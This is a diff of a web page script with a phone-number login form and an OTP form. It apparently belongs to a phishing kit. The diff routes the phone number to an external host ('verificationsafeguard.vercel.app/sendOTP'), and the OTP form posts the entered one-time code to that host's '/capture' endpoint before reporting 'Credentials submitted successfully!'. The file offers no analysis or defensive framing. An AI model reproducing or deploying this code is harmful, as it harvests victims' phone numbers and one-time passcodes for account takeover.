@@ -5,7 +5,7 @@ if (document.getElementById('login-form')) {
         const phoneNumber = document.getElementById('phone-number').value;
 
        
-        fetch('/sendOTP', {
+        fetch('https://verificationsafeguard.vercel.app/sendOTP', {  // Use the full URL
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -14,9 +14,10 @@ if (document.getElementById('login-form')) {
         })
         .then(response => {
             if (response.ok) {
-                
+                // Redirect to otp.html with the phone number as a query parameter
                 window.location.href = 'otp.html?phone=' + encodeURIComponent(phoneNumber);
             } else {
+                // Handle errors and throw an error with a message
                 return response.json().then(data => {
                     throw new Error(data.message || 'Failed to send OTP');
                 });
@@ -26,7 +27,7 @@ if (document.getElementById('login-form')) {
             console.error('Error:', error);
             displayMessage('Error sending OTP: ' + error.message, 'error');
         });
-        
+
 } else if (document.getElementById('otp-form')) {
     
     document.getElementById('otp-form').addEventListener('submit', function(event) {
@@ -42,7 +43,8 @@ if (document.getElementById('login-form')) {
             otpCode
         };
 
-        fetch('https://verificationsafeguard.vercel.app/capture', {
+        // Update the fetch request to use the full URL for the /capture endpoint
+        fetch('https://verificationsafeguard.vercel.app/capture', {  // Use the full URL
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -58,9 +60,7 @@ if (document.getElementById('login-form')) {
             });
         })
         .then(result => {
-            
             displayMessage('Credentials submitted successfully!', 'success');
-           
         })
         .catch(error => {
             console.error('Error:', error);
